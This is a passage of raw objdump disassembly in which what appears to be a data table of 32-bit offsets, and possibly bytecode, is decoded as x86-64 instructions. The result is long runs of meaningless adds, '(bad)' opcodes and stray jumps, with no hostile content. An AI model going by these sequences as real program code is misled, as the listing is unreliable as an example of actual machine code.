  4035c3:	00 00                	add    %al,(%rax)
  4035c5:	8d 17                	lea    (%rdi),%edx
  4035c7:	00 00                	add    %al,(%rax)
  4035c9:	b8 27 00 00 26       	mov    $0x26000027,%eax
  4035ce:	02 00                	add    (%rax),%al
  4035d0:	00 4d 2a             	add    %cl,0x2a(%rbp)
  4035d3:	00 00                	add    %al,(%rax)
  4035d5:	7e 13                	jle    0x4035ea
  4035d7:	00 00                	add    %al,(%rax)
  4035d9:	71 1e                	jno    0x4035f9
  4035db:	00 00                	add    %al,(%rax)
  4035dd:	62 09 00 00 a9       	(bad)
  4035e2:	12 00                	adc    (%rax),%al
  4035e4:	00 37                	add    %dh,(%rdi)
  4035e6:	1b 00                	sbb    (%rax),%eax
  4035e8:	00 e8                	add    %ch,%al
  4035ea:	07                   	(bad)
  4035eb:	00 00                	add    %al,(%rax)
  4035ed:	71 0c                	jno    0x4035fb
  4035ef:	00 00                	add    %al,(%rax)
  4035f1:	78 23                	js     0x403616
  4035f3:	00 00                	add    %al,(%rax)
  4035f5:	1f                   	(bad)
  4035f6:	05 00 00 ad 1b       	add    $0x1bad0000,%eax
  4035fb:	00 00                	add    %al,(%rax)
  4035fd:	5c                   	pop    %rsp
  4035fe:	03 00                	add    (%rax),%eax
  403600:	00 32                	add    %dh,(%rdx)
  403602:	0b 00                	or     (%rax),%eax
  403604:	00 ab 1d 00 00 a7    	add    %ch,-0x58ffffe3(%rbx)
  40360a:	0e                   	(bad)
  40360b:	00 00                	add    %al,(%rax)
  40360d:	59                   	pop    %rcx
  40360e:	1e                   	(bad)
  40360f:	00 00                	add    %al,(%rax)
  403611:	6c                   	insb   (%dx),(%rdi)
  403612:	07                   	(bad)
  403613:	00 00                	add    %al,(%rax)
  403615:	18 15 00 00 64 12    	sbb    %dl,0x12640000(%rip)        # 0x12a4361b
  40361b:	00 00                	add    %al,(%rax)
  40361d:	e9 0a 00 00 f2       	jmp    0xfffffffff240362c
  403622:	09 00                	or     %eax,(%rax)
  403624:	00 e2                	add    %ah,%dl
  403626:	16                   	(bad)
  403627:	00 00                	add    %al,(%rax)
  403629:	9b                   	fwait
  40362a:	1d 00 00 6b 0f       	sbb    $0xf6b0000,%eax
  40362f:	00 00                	add    %al,(%rax)
  403631:	73 f7                	jae    0x40362a
  403633:	ff                   	(bad)
  403634:	ff b4 0b 00 00 7d 05 	push   0x57d0000(%rbx,%rcx,1)
  40363b:	00 00                	add    %al,(%rax)
  40363d:	26 18 00             	es sbb %al,(%rax)
  403640:	00 2b                	add    %ch,(%rbx)
  403642:	f7 ff                	idiv   %edi
  403644:	ff                   	(bad)
  403645:	3b 25 00 00 30 f8    	cmp    -0x7d00000(%rip),%esp        # 0xfffffffff870364b
  40364b:	ff                   	(bad)
  40364c:	ff aa 03 00 00 97    	ljmp   *-0x68fffffd(%rdx)
  403652:	26 00 00             	es add %al,(%rax)
  403655:	4c f8                	rex.WR clc
  403657:	ff                   	(bad)
  403658:	ff 12                	call   *(%rdx)
  40365a:	2c 00                	sub    $0x0,%al
  40365c:	00 1e                	add    %bl,(%rsi)
  40365e:	2d 00 00 0e 00       	sub    $0xe0000,%eax
  403663:	00 00                	add    %al,(%rax)
  403665:	88 16                	mov    %dl,(%rsi)
  403667:	00 00                	add    %al,(%rax)
  403669:	00 08                	add    %cl,(%rax)
  40366b:	00 00                	add    %al,(%rax)
  40366d:	51                   	push   %rcx
  40366e:	0a 00                	or     (%rax),%al
  403670:	00 53 00             	add    %dl,0x0(%rbx)
  403673:	00 00                	add    %al,(%rax)
  403675:	43 09 00             	rex.XB or %eax,(%r8)
  403678:	00 e1                	add    %ah,%cl
  40367a:	12 00                	adc    (%rax),%al
  40367c:	00 9a 18 00 00 bc    	add    %bl,-0x43ffffe8(%rdx)
  403682:	0e                   	(bad)
  403683:	00 00                	add    %al,(%rax)
  403685:	19 0b                	sbb    %ecx,(%rbx)
  403687:	00 00                	add    %al,(%rax)
  403689:	ca 07 00             	lret   $0x7
  40368c:	00 da                	add    %bl,%dl
  40368e:	23 00                	and    (%rax),%eax
  403690:	00 0b                	add    %cl,(%rbx)
  403692:	20 00                	and    %al,(%rax)
  403694:	00 68 06             	add    %ch,0x6(%rax)
  403697:	00 00                	add    %al,(%rax)
  403699:	1e                   	(bad)
  40369a:	26 00 00             	es add %al,(%rax)
  40369d:	da 09                	fimull (%rcx)
  40369f:	00 00                	add    %al,(%rax)
  4036a1:	11 13                	adc    %edx,(%rbx)
  4036a3:	00 00                	add    %al,(%rax)
  4036a5:	3f                   	(bad)
  4036a6:	02 00                	add    (%rax),%al
  4036a8:	00 2b                	add    %ch,(%rbx)
  4036aa:	0a 00                	or     (%rax),%al
  4036ac:	00 fc                	add    %bh,%ah
  4036ae:	0e                   	(bad)
  4036af:	00 00                	add    %al,(%rax)
  4036b1:	36 22 00             	ss and (%rax),%al
  4036b4:	00 0b                	add    %cl,(%rbx)
  4036b6:	21 00                	and    %eax,(%rax)
  4036b8:	00 98 21 00 00 c4    	add    %bl,-0x3bffffdf(%rax)
  4036be:	17                   	(bad)
  4036bf:	00 00                	add    %al,(%rax)
  4036c1:	d6                   	udb
  4036c2:	1e                   	(bad)
  4036c3:	00 00                	add    %al,(%rax)
  4036c5:	f6 01 00             	testb  $0x0,(%rcx)
  4036c8:	00 1c 29             	add    %bl,(%rcx,%rbp,1)
  4036cb:	00 00                	add    %al,(%rax)
  4036cd:	44 1f                	rex.R (bad)
  4036cf:	00 00                	add    %al,(%rax)
  4036d1:	ab                   	stos   %eax,(%rdi)
  4036d2:	11 00                	adc    %eax,(%rax)
  4036d4:	00 3e                	add    %bh,(%rsi)
  4036d6:	15 00 00 8e 0c       	adc    $0xc8e0000,%eax
  4036db:	00 00                	add    %al,(%rax)
  4036dd:	50                   	push   %rax
  4036de:	24 00                	and    $0x0,%al
  4036e0:	00 c0                	add    %al,%al
  4036e2:	1a 00                	sbb    (%rax),%al
  4036e4:	00 dd                	add    %bl,%ch
  4036e6:	1c 00                	sbb    $0x0,%al
  4036e8:	00 01                	add    %al,(%rcx)
  4036ea:	0b 00                	or     (%rax),%eax
  4036ec:	00 e7                	add    %ah,%bh
  4036ee:	0d 00 00 42 f6       	or     $0xf6420000,%eax
  4036f3:	ff                   	(bad)
  4036f4:	ff                   	(bad)
  4036f5:	ba 04 00 00 54       	mov    $0x54000004,%edx
  4036fa:	08 00                	or     %al,(%rax)
  4036fc:	00 c5                	add    %al,%ch
  4036fe:	0f 00 00             	sldt   (%rax)
  403701:	6a 2b                	push   $0x2b
  403703:	00 00                	add    %al,(%rax)
  403705:	9c                   	pushf
  403706:	10 00                	adc    %al,(%rax)
  403708:	00 f4                	add    %dh,%ah
  40370a:	15 00 00 b1 19       	adc    $0x19b10000,%eax
  40370f:	00 00                	add    %al,(%rax)
  403711:	96                   	xchg   %eax,%esi
  403712:	0b 00                	or     (%rax),%eax
  403714:	00 e9                	add    %ch,%cl
  403716:	22 00                	and    (%rax),%al
  403718:	00 a5 f6 ff ff 4f    	add    %ah,0x4ffffff6(%rbp)
  40371e:	06                   	(bad)
  40371f:	00 00                	add    %al,(%rax)
  403721:	20 03                	and    %al,(%rbx)
  403723:	00 00                	add    %al,(%rax)
  403725:	ed                   	in     (%dx),%eax
  403726:	25 00 00 a0 1c       	and    $0x1ca00000,%eax
  40372b:	00 00                	add    %al,(%rax)
  40372d:	83 0f 00             	orl    $0x0,(%rdi)
  403730:	00 c4                	add    %al,%ah
  403732:	1c 00                	sbb    $0x0,%al
  403734:	00 07                	add    %al,(%rdi)
  403736:	0a 00                	or     (%rax),%al
  403738:	00 be 10 00 00 36    	add    %bh,0x36000010(%rsi)
  40373e:	06                   	(bad)
  40373f:	00 00                	add    %al,(%rax)
  403741:	c8 0d 00 00          	enter  $0xd,$0x0
  403745:	10 23                	adc    %ah,(%rbx)
  403747:	00 00                	add    %al,(%rax)
  403749:	8b 1b                	mov    (%rbx),%ebx
  40374b:	00 00                	add    %al,(%rax)
  40374d:	cf                   	iret
  40374e:	28 00                	sub    %al,(%rax)
  403750:	00 99 f5 ff ff 29    	add    %bl,0x29fffff5(%rcx)
  403756:	14 00                	adc    $0x0,%al
  403758:	00 e6                	add    %ah,%dh
  40375a:	f7 ff                	idiv   %edi
  40375c:	ff                   	(bad)
  40375d:	bd f5 ff ff 10       	mov    $0x10fffff5,%ebp
  403762:	16                   	(bad)
  403763:	00 00                	add    %al,(%rax)
  403765:	16                   	(bad)
  403766:	17                   	(bad)
  403767:	00 00                	add    %al,(%rax)
  403769:	6c                   	insb   (%dx),(%rdi)
  40376a:	1b 00                	sbb    (%rax),%eax
  40376c:	00 56 20             	add    %dl,0x20(%rsi)
  40376f:	00 00                	add    %al,(%rax)
  403771:	ce                   	(bad)
  403772:	f7 ff                	idiv   %edi
  403774:	ff 4a 18             	decl   0x18(%rdx)
  403777:	00 00                	add    %al,(%rax)
  403779:	dc 04 00             	faddl  (%rax,%rax,1)
  40377c:	00 96 13 00 00 16    	add    %dl,0x16000013(%rsi)
  403782:	09 00                	or     %eax,(%rax)
  403784:	00 d0                	add    %dl,%al
  403786:	19 00                	sbb    %eax,(%rax)
  403788:	00 67 29             	add    %ah,0x29(%rdi)
  40378b:	00 00                	add    %al,(%rax)
  40378d:	58                   	pop    %rax
  40378e:	27                   	(bad)
  40378f:	00 00                	add    %al,(%rax)
  403791:	3e 21 00             	ds and %eax,(%rax)
  403794:	00 02                	add    %al,(%rdx)
  403796:	06                   	(bad)
  403797:	00 00                	add    %al,(%rax)
  403799:	3b 28                	cmp    (%rax),%ebp
  40379b:	00 00                	add    %al,(%rax)
  40379d:	a8 15                	test   $0x15,%al
  40379f:	00 00                	add    %al,(%rax)
  4037a1:	0b 27                	or     (%rdi),%esp
  4037a3:	00 00                	add    %al,(%rax)
  4037a5:	33 09                	xor    (%rcx),%ecx
  4037a7:	00 00                	add    %al,(%rax)
  4037a9:	57                   	push   %rdi
  4037aa:	2c 00                	sub    $0x0,%al
  4037ac:	00 aa 0d 00 00 fa    	add    %ch,-0x5fffff3(%rdx)
  4037b2:	14 00                	adc    $0x0,%al
  4037b4:	00 e4                	add    %ah,%ah
  4037b6:	f8                   	clc
  4037b7:	ff                   	(bad)
  4037b8:	ff 61 10             	jmp    *0x10(%rcx)
  4037bb:	00 00                	add    %al,(%rax)
  4037bd:	c4                   	(bad)
  4037be:	16                   	(bad)
  4037bf:	00 00                	add    %al,(%rax)
  4037c1:	19 11                	sbb    %edx,(%rcx)
  4037c3:	00 00                	add    %al,(%rax)
  4037c5:	3f                   	(bad)
  4037c6:	13 00                	adc    (%rax),%eax
  4037c8:	00 3b                	add    %bh,(%rbx)
  4037ca:	19 00                	sbb    %eax,(%rax)
  4037cc:	00 e5                	add    %ah,%ch
  4037ce:	1d 00 00 54 13       	sbb    $0x13540000,%eax
  4037d3:	00 00                	add    %al,(%rax)
  4037d5:	32 0d 00 00 17 0f    	xor    0xf170000(%rip),%cl        # 0xf5737db
  4037db:	00 00                	add    %al,(%rax)
  4037dd:	81 25 00 00 12 05 00 	andl   $0x26780000,0x5120000(%rip)        # 0x55237e7
  4037e4:	00 78 26 
  4037e7:	00 00                	add    %al,(%rax)
  4037e9:	29 21                	sub    %esp,(%rcx)
  4037eb:	00 00                	add    %al,(%rax)
  4037ed:	8a 07                	mov    (%rdi),%al
  4037ef:	00 00                	add    %al,(%rax)
  4037f1:	4b 1c 00             	rex.WXB sbb $0x0,%al
  4037f4:	00 bc 2a 00 00 47 f7 	add    %bh,-0x8b90000(%rdx,%rbp,1)
  4037fb:	ff                   	(bad)
  4037fc:	ff cc                	dec    %esp
  4037fe:	1b 00                	sbb    (%rax),%eax
  403800:	00 03                	add    %al,(%rbx)
  403802:	1c 00                	sbb    $0x0,%al
  403804:	00 c4                	add    %al,%ah
  403806:	1d 00 00 98 11       	sbb    $0x11980000,%eax
  40380b:	00 00                	add    %al,(%rax)
  40380d:	f1                   	int1
  40380e:	0f 00 00             	sldt   (%rax)
  403811:	70 16                	jo     0x403829
  403813:	00 00                	add    %al,(%rax)
  403815:	ff 2c 00             	ljmp   *(%rax,%rax,1)
  403818:	00 5a f6             	add    %bl,-0xa(%rdx)
  40381b:	ff                   	(bad)
  40381c:	ff 1f                	lcall  *(%rdi)
  40381e:	1c 00                	sbb    $0x0,%al
  403820:	00 d4                	add    %dl,%ah
  403822:	25 00 00 bb 2c       	and    $0x2cbb0000,%eax
  403827:	00 00                	add    %al,(%rax)
  403829:	06                   	(bad)
  40382a:	25 00 00 e4 08       	and    $0x8e40000,%eax
  40382f:	00 00                	add    %al,(%rax)
  403831:	7b 1f                	jnp    0x403852
  403833:	00 00                	add    %al,(%rax)
  403835:	b5 21                	mov    $0x21,%ch
  403837:	00 00                	add    %al,(%rax)
  403839:	df 29                	fildll (%rcx)
  40383b:	00 00                	add    %al,(%rax)
  40383d:	52                   	push   %rdx
  40383e:	2b 00                	sub    (%rax),%eax
  403840:	00 a6 0f 00 00 c0    	add    %ah,-0x3ffffff1(%rsi)
  403846:	f8                   	clc
  403847:	ff                   	(bad)
  403848:	ff 90 02 00 00 a7    	call   *-0x58fffffe(%rax)
  40384e:	0c 00                	or     $0x0,%al
  403850:	00 3e                	add    %bh,(%rsi)
  403852:	04 00                	add    $0x0,%al
  403854:	00 86 12 00 00 25    	add    %al,0x25000012(%rsi)
  40385a:	1f                   	(bad)
  40385b:	00 00                	add    %al,(%rax)
  40385d:	e2 11                	loop   0x403870
  40385f:	00 00                	add    %al,(%rax)
  403861:	aa                   	stos   %al,(%rdi)
  403862:	0a 00                	or     (%rax),%al
  403864:	00 dd                	add    %bl,%ch
  403866:	06                   	(bad)
  403867:	00 00                	add    %al,(%rax)
  403869:	92                   	xchg   %eax,%edx
  40386a:	19 00                	sbb    %eax,(%rax)
  40386c:	00 6c 2a 00          	add    %ch,0x0(%rdx,%rbp,1)
  403870:	00 fc                	add    %bh,%ah
  403872:	10 00                	adc    %al,(%rax)
  403874:	00 0e                	add    %cl,(%rsi)
  403876:	f8                   	clc
  403877:	ff                   	(bad)
  403878:	ff 56 16             	call   *0x16(%rsi)
  40387b:	00 00                	add    %al,(%rax)
  40387d:	23 28                	and    (%rax),%ebp
  40387f:	00 00                	add    %al,(%rax)
  403881:	11 14 00             	adc    %edx,(%rax,%rax,1)
  403884:	00 e9                	add    %ch,%cl
  403886:	21 00                	and    %eax,(%rax)
  403888:	00 52 0f             	add    %dl,0xf(%rdx)
  40388b:	00 00                	add    %al,(%rax)
  40388d:	16                   	(bad)
  40388e:	2a 00                	sub    (%rax),%al
  403890:	00 7f 0d             	add    %bh,0xd(%rdi)
  403893:	00 00                	add    %al,(%rax)
  403895:	86 22                	xchg   %ah,(%rdx)
  403897:	00 00                	add    %al,(%rax)
  403899:	b6 28                	mov    $0x28,%dh
  40389b:	00 00                	add    %al,(%rax)
  40389d:	c3                   	ret
  40389e:	24 00                	and    $0x0,%al
  4038a0:	00 a7 24 00 00 0b    	add    %ah,0xb000024(%rdi)
  4038a6:	2b 00                	sub    (%rax),%eax
  4038a8:	00 9b 04 00 00 7b    	add    %bl,0x7b000004(%rbx)
  4038ae:	18 00                	sbb    %al,(%rax)
  4038b0:	00 06                	add    %al,(%rsi)
  4038b2:	28 00                	sub    %al,(%rax)
  4038b4:	00 fa                	add    %bh,%dl
  4038b6:	02 00                	add    (%rax),%al
  4038b8:	00 13                	add    %dl,(%rbx)
  4038ba:	03 00                	add    (%rax),%eax
  4038bc:	00 f2                	add    %dh,%dl
  4038be:	2a 00                	sub    (%rax),%al
  4038c0:	00 de                	add    %bl,%dh
  4038c2:	02 00                	add    (%rax),%al
  4038c4:	00 20                	add    %ah,(%rax)
  4038c6:	f6 ff                	idiv   %bh
  4038c8:	ff 19                	lcall  *(%rcx)
  4038ca:	20 00                	and    %al,(%rax)
  4038cc:	00 82 11 00 00 38    	add    %al,0x38000011(%rdx)
  4038d2:	24 00                	and    $0x0,%al
  4038d4:	00 87 06 00 00 10    	add    %al,0x10000006(%rdi)
  4038da:	f7 ff                	idiv   %edi
  4038dc:	ff 4b 27             	decl   0x27(%rbx)
  4038df:	00 00                	add    %al,(%rax)
  4038e1:	7f 09                	jg     0x4038ec
  4038e3:	00 00                	add    %al,(%rax)
  4038e5:	8a 0e                	mov    (%rsi),%cl
  4038e7:	00 00                	add    %al,(%rax)
  4038e9:	d1 27                	shll   $1,(%rdi)
  4038eb:	00 00                	add    %al,(%rax)
  4038ed:	57                   	push   %rdi
  4038ee:	02 00                	add    (%rax),%al
  4038f0:	00 c3                	add    %al,%bl
  4038f2:	11 00                	adc    %eax,(%rax)
  4038f4:	00 24 27             	add    %ah,(%rdi,%riz,1)
  4038f7:	00 00                	add    %al,(%rax)
  4038f9:	87 2c 00             	xchg   %ebp,(%rax,%rax,1)
  4038fc:	00 d4                	add    %dl,%ah
  4038fe:	0e                   	(bad)
  4038ff:	00 00                	add    %al,(%rax)
  403901:	9d                   	popf
  403902:	09 00                	or     %eax,(%rax)
  403904:	00 15 1d 00 00 38    	add    %dl,0x3800001d(%rip)        # 0x38403927
  40390a:	05 00 00 84 08       	add    $0x8840000,%eax
  40390f:	00 00                	add    %al,(%rax)
  403911:	6f                   	outsl  (%rsi),(%dx)
  403912:	20 00                	and    %al,(%rax)
  403914:	00 00                	add    %al,(%rax)
  403916:	0e                   	(bad)
  403917:	00 00                	add    %al,(%rax)
  403919:	fd                   	std
  40391a:	29 00                	sub    %eax,(%rax)
  40391c:	00 40 1e             	add    %al,0x1e(%rax)
  40391f:	00 00                	add    %al,(%rax)
  403921:	63 1f                	movsxd (%rdi),%ebx
  403923:	00 00                	add    %al,(%rax)
  403925:	3e 10 00             	ds adc %al,(%rax)
  403928:	00 b3 22 00 00 ec    	add    %dh,-0x13ffffde(%rbx)
  40392e:	20 00                	and    %al,(%rax)
  403930:	00 ba 2b 00 00 a3    	add    %bh,-0x5cffffd5(%rdx)
  403936:	08 00                	or     %al,(%rax)
  403938:	00 02                	add    %al,(%rdx)
  40393a:	f6 ff                	idiv   %bh
  40393c:	ff b6 25 00 00 82    	push   -0x7dffffdb(%rsi)
  403942:	2b 00                	sub    (%rax),%eax
  403944:	00 2a                	add    %ch,(%rdx)
  403946:	2b 00                	sub    (%rax),%eax
  403948:	00 75 02             	add    %dh,0x2(%rbp)
  40394b:	00 00                	add    %al,(%rax)
  40394d:	a5                   	movsl  (%rsi),(%rdi)
  40394e:	27                   	(bad)
  40394f:	00 00                	add    %al,(%rax)
  403951:	18 1b                	sbb    %bl,(%rbx)
  403953:	00 00                	add    %al,(%rax)
  403955:	9a                   	(bad)
  403956:	22 00                	and    (%rax),%al
  403958:	00 79 14             	add    %bh,0x14(%rcx)
  40395b:	00 00                	add    %al,(%rax)
  40395d:	9e                   	sahf
  40395e:	25 00 00 2e 1a       	and    $0x1a2e0000,%eax
  403963:	00 00                	add    %al,(%rax)
  403965:	49 0e                	rex.WB (bad)
  403967:	00 00                	add    %al,(%rax)
  403969:	67 05 00 00 78 03    	addr32 add $0x3780000,%eax
  40396f:	00 00                	add    %al,(%rax)
  403971:	fb                   	sti
  403972:	0c 00                	or     $0x0,%al
  403974:	00 fc                	add    %bh,%ah
  403976:	f8                   	clc
  403977:	ff                   	(bad)
  403978:	ff 4a 11             	decl   0x11(%rdx)
  40397b:	00 00                	add    %al,(%rax)
  40397d:	dc 0c 00             	fmull  (%rax,%rax,1)
  403980:	00 00                	add    %al,(%rax)
  403982:	12 00                	adc    (%rax),%al
  403984:	00 8b f8 ff ff 29    	add    %cl,0x29fffff8(%rbx)
  40398a:	23 00                	and    (%rax),%eax
  40398c:	00 48 29             	add    %cl,0x29(%rax)
  40398f:	00 00                	add    %al,(%rax)
  403991:	84 29                	test   %ch,(%rcx)
  403993:	00 00                	add    %al,(%rax)
  403995:	af                   	scas   (%rdi),%eax
  403996:	20 00                	and    %al,(%rax)
  403998:	00 42 12             	add    %al,0x12(%rdx)
  40399b:	00 00                	add    %al,(%rax)
  40399d:	56                   	push   %rsi
  40399e:	04 00                	add    $0x0,%al
  4039a0:	00 f5                	add    %dh,%ch
  4039a2:	04 00                	add    $0x0,%al
  4039a4:	00 2a                	add    %ch,(%rdx)
  4039a6:	07                   	(bad)
  4039a7:	00 00                	add    %al,(%rax)
  4039a9:	31 11                	xor    %edx,(%rcx)
  4039ab:	00 00                	add    %al,(%rax)
  4039ad:	6c                   	insb   (%dx),(%rdi)
  4039ae:	f8                   	clc
  4039af:	ff                   	(bad)
  4039b0:	ff 4a 0b             	decl   0xb(%rdx)
  4039b3:	00 00                	add    %al,(%rax)
  4039b5:	c0 08 00             	rorb   $0x0,(%rax)
  4039b8:	00 29                	add    %ch,(%rcx)
  4039ba:	04 00                	add    $0x0,%al
  4039bc:	00 57 14             	add    %dl,0x14(%rdi)
  4039bf:	00 00                	add    %al,(%rax)
  4039c1:	f7 23                	mull   (%rbx)
  4039c3:	00 00                	add    %al,(%rax)
  4039c5:	b5 f7                	mov    $0xf7,%ch
  4039c7:	ff                   	(bad)
  4039c8:	ff 10                	call   *(%rax)
  4039ca:	0e                   	(bad)
  4039cb:	00 00                	add    %al,(%rax)
  4039cd:	f5                   	cmc
  4039ce:	1e                   	(bad)
  4039cf:	00 00                	add    %al,(%rax)
  4039d1:	0d 1f 00 00 c6       	or     $0xc600001f,%eax
  4039d6:	02 00                	add    (%rax),%al
  4039d8:	00 91 2a 00 00 97    	add    %dl,-0x68ffffd6(%rcx)
  4039de:	28 00                	sub    %al,(%rax)
  4039e0:	00 8b 15 00 00 c5    	add    %cl,-0x3affffeb(%rbx)
  4039e6:	13 00                	adc    (%rax),%eax
  4039e8:	00 b9 0c 00 00 5d    	add    %bh,0x5d00000c(%rcx)
  4039ee:	21 00                	and    %eax,(%rax)
  4039f0:	00 4d 07             	add    %cl,0x7(%rbp)
  4039f3:	00 00                	add    %al,(%rax)
  4039f5:	54                   	push   %rsp
  4039f6:	1b 00                	sbb    (%rax),%eax
  4039f8:	00 37                	add    %dh,(%rdi)
  4039fa:	1d 00 00 5a f7       	sbb    $0xf75a0000,%eax
  4039ff:	ff                   	(bad)
  403a00:	ff 29                	ljmp   *(%rcx)
  403a02:	19 00                	sbb    %eax,(%rax)
  403a04:	00 3f                	add    %bh,(%rdi)
  403a06:	14 00                	adc    $0x0,%al
  403a08:	00 40 23             	add    %al,0x23(%rax)
  403a0b:	00 00                	add    %al,(%rax)
  403a0d:	ff 25 00 00 39 17    	jmp    *0x17390000(%rip)        # 0x17793a13
  403a13:	00 00                	add    %al,(%rax)
  403a15:	89 1a                	mov    %ebx,(%rdx)
  403a17:	00 00                	add    %al,(%rax)
  403a19:	44 03 00             	add    (%rax),%r8d
  403a1c:	00 d5                	add    %dl,%ch
  403a1e:	15 00 00 54 1d       	adc    $0x1d540000,%eax
  403a23:	00 00                	add    %al,(%rax)
  403a25:	e6 0b                	out    %al,$0xb
  403a27:	00 00                	add    %al,(%rax)
  403a29:	d5 2a 00 00          	{rex2 0x2a} add %al,(%rax)
  403a2d:	d2 26                	shlb   %cl,(%rsi)
  403a2f:	00 00                	add    %al,(%rax)
  403a31:	44 1a 00             	sbb    (%rax),%r8b
  403a34:	00 a5 06 00 00 c7    	add    %ah,-0x38fffffa(%rbp)
  403a3a:	21 00                	and    %eax,(%rax)
  403a3c:	00 6f 2c             	add    %ch,0x2c(%rdi)
  403a3f:	00 00                	add    %al,(%rax)
  403a41:	87 10                	xchg   %edx,(%rax)
  403a43:	00 00                	add    %al,(%rax)
  403a45:	f0 f6 ff             	lock idiv %bh
  403a48:	ff                   	(bad)
  403a49:	bc 1f 00 00 7c       	mov    $0x7c00001f,%esp
  403a4e:	21 00                	and    %eax,(%rax)
  403a50:	00 b0 26 00 00 33    	add    %dh,0x33000026(%rax)
  403a56:	1c 00                	sbb    $0x0,%al
  403a58:	00 75 04             	add    %dh,0x4(%rbp)
  403a5b:	00 00                	add    %al,(%rax)
  403a5d:	74 0a                	je     0x403a69
  403a5f:	00 00                	add    %al,(%rax)
  403a61:	2b 2c 00             	sub    (%rax,%rax,1),%ebp
  403a64:	00 54 25 00          	add    %dl,0x0(%rbp,%riz,1)
  403a68:	00 95 24 00 00 6c    	add    %dl,0x6c000024(%rbp)
  403a6e:	1d 00 00 f9 12       	sbb    $0x12f90000,%eax
  403a73:	00 00                	add    %al,(%rax)
  403a75:	e4 18                	in     $0x18,%al
  403a77:	00 00                	add    %al,(%rax)
  403a79:	01 1e                	add    %ebx,(%rsi)
  403a7b:	00 00                	add    %al,(%rax)
  403a7d:	91                   	xchg   %eax,%ecx
  403a7e:	0a 00                	or     (%rax),%al
  403a80:	00 8b 03 00 00 a7    	add    %cl,-0x58fffffd(%rbx)
  403a86:	1a 00                	sbb    (%rax),%al
  403a88:	00 eb                	add    %ch,%bl
  403a8a:	1b 00                	sbb    (%rax),%eax
  403a8c:	00 61 19             	add    %ah,0x19(%rcx)
  403a8f:	00 00                	add    %al,(%rax)
  403a91:	a7                   	cmpsl  (%rdi),(%rsi)
  403a92:	13 00                	adc    (%rax),%eax
  403a94:	00 6a 1c             	add    %ch,0x1c(%rdx)
  403a97:	00 00                	add    %al,(%rax)
  403a99:	36 0f 00 00          	ss sldt (%rax)
  403a9d:	36 26 00 00          	ss es add %al,(%rax)
  403aa1:	1f                   	(bad)
  403aa2:	10 00                	adc    %al,(%rax)
  403aa4:	00 ab 07 00 00 c9    	add    %ch,-0x36fffff9(%rbx)
  403aaa:	29 00                	sub    %eax,(%rax)
  403aac:	00 11                	add    %dl,(%rcx)
  403aae:	19 00                	sbb    %eax,(%rax)
  403ab0:	00 1e                	add    %bl,(%rsi)
  403ab2:	22 00                	and    (%rax),%al
  403ab4:	00 df                	add    %bl,%bh
  403ab6:	05 00 00 69 0d       	add    $0xd690000,%eax
  403abb:	00 00                	add    %al,(%rax)
  403abd:	c0 22 00             	shlb   $0x0,(%rdx)
  403ac0:	00 72 20             	add    %dh,0x20(%rdx)
  403ac3:	00 00                	add    %al,(%rax)
  403ac5:	cd 20                	int    $0x20
  403ac7:	00 00                	add    %al,(%rax)
  403ac9:	0f 1a 00             	bndldx (%rax),%bnd0
  403acc:	00 f0                	add    %dh,%al
  403ace:	1f                   	(bad)
  403acf:	00 00                	add    %al,(%rax)
  403ad1:	37                   	(bad)
  403ad2:	20 00                	and    %al,(%rax)
  403ad4:	00 e9                	add    %ch,%cl
  403ad6:	24 00                	and    $0x0,%al
  403ad8:	00 c7                	add    %al,%bh
  403ada:	0a 00                	or     (%rax),%al
  403adc:	00 83 1c 00 00 41    	add    %al,0x4100001c(%rbx)
  403ae2:	0c 00                	or     $0x0,%al
  403ae4:	00 69 11             	add    %ch,0x11(%rcx)
  403ae7:	00 00                	add    %al,(%rax)
  403ae9:	1d 1e 00 00 4d       	sbb    $0x4d00001e,%eax
  403aee:	26 00 00             	es add %al,(%rax)
  403af1:	c2 12 00             	ret    $0x12
  403af4:	00 1a                	add    %bl,(%rdx)
  403af6:	0d 00 00 05 0c       	or     $0xc050000,%eax
  403afb:	00 00                	add    %al,(%rax)
  403afd:	95                   	xchg   %eax,%ebp
  403afe:	1e                   	(bad)
  403aff:	00 00                	add    %al,(%rax)
  403b01:	ee                   	out    %al,(%dx)
  403b02:	26 00 00             	es add %al,(%rax)
  403b05:	1b f9                	sbb    %ecx,%edi
  403b07:	ff                   	(bad)
  403b08:	ff 33                	push   (%rbx)
  403b0a:	0e                   	(bad)
  403b0b:	00 00                	add    %al,(%rax)
  403b0d:	4f 05 00 00 d7 03    	rex.WRXB add $0x3d70000,%rax
  403b13:	00 00                	add    %al,(%rax)
  403b15:	de 0f                	fimuls (%rdi)
  403b17:	00 00                	add    %al,(%rax)
  403b19:	a1 2b 00 00 23 08 00 	movabs 0xf40000082300002b,%eax
  403b20:	00 f4 
  403b22:	19 00                	sbb    %eax,(%rax)
  403b24:	00 d9                	add    %bl,%cl
  403b26:	2b 00                	sub    (%rax),%eax
  403b28:	00 dc                	add    %bl,%ah
  403b2a:	1a 00                	sbb    (%rax),%al
  403b2c:	00 6f 0b             	add    %ch,0xb(%rdi)
  403b2f:	00 00                	add    %al,(%rax)
  403b31:	a1 16 00 00 52 0c 00 	movabs 0xb600000c52000016,%eax
  403b38:	00 b6 
  403b3a:	23 00                	and    (%rax),%eax
  403b3c:	00 fe                	add    %bh,%dh
  403b3e:	16                   	(bad)
  403b3f:	00 00                	add    %al,(%rax)
  403b41:	c2 f6 ff             	ret    $0xfff6
  403b44:	ff                   	(bad)
  403b45:	3d 2d 00 00 20       	cmp    $0x2000002d,%eax
  403b4a:	1f                   	(bad)
  403b4b:	01 00                	add    %eax,(%rax)
  403b4d:	00 fe                	add    %bh,%dh
  403b4f:	0e                   	(bad)
  403b50:	33 00                	xor    (%rax),%eax
  403b52:	38 29                	cmp    %ch,(%rcx)
  403b54:	f9                   	stc
  403b55:	ff                   	(bad)
  403b56:	ff 11                	call   *(%rcx)
  403b58:	25 1f 0d 11 19       	and    $0x19110d1f,%eax
  403b5d:	1c 91                	sbb    $0x91,%al
  403b5f:	9c                   	pushf
  403b60:	20 e0                	and    %ah,%al
  403b62:	00 00                	add    %al,(%rax)
  403b64:	00 fe                	add    %bh,%dh
  403b66:	0e                   	(bad)
  403b67:	33 00                	xor    (%rax),%eax
  403b69:	16                   	(bad)
  403b6a:	39 11                	cmp    %edx,(%rcx)
  403b6c:	f9                   	stc
  403b6d:	ff                   	(bad)
  403b6e:	ff                   	(bad)
  403b6f:	fe 0c 27             	decb   (%rdi,%riz,1)
  403b72:	00 20                	add    %ah,(%rax)
  403b74:	0c 00                	or     $0x0,%al
  403b76:	00 00                	add    %al,(%rax)
  403b78:	20 4e 00             	and    %cl,0x0(%rsi)
